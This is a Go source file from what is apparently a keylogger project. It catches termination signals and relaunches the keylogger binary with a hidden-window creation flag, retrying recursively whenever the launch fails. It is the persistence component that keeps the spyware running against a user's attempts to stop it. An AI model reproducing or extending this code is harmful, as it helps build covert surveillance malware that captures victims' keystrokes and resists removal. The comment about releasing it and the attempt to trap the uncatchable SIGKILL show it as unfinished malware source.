package catch

import (
	"os"
	"os/exec"
	"os/signal"
	"syscall"

	"github.com/Tom5521/keylogger/internal/cfgs"
)

func InitCatcher() {
	terminate := make(chan os.Signal, 1)
	signal.Notify(terminate, syscall.SIGINT, syscall.SIGTERM, syscall.SIGKILL)
	for range terminate {
		go Relaunch()
		return
	}
}

func Relaunch() {
	cmd := exec.Command(cfgs.Settings.BinDir)
	// TODO:Uncomment to release
	cmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000}
	err := cmd.Run()
	if err != nil {
		Relaunch()
	}
}
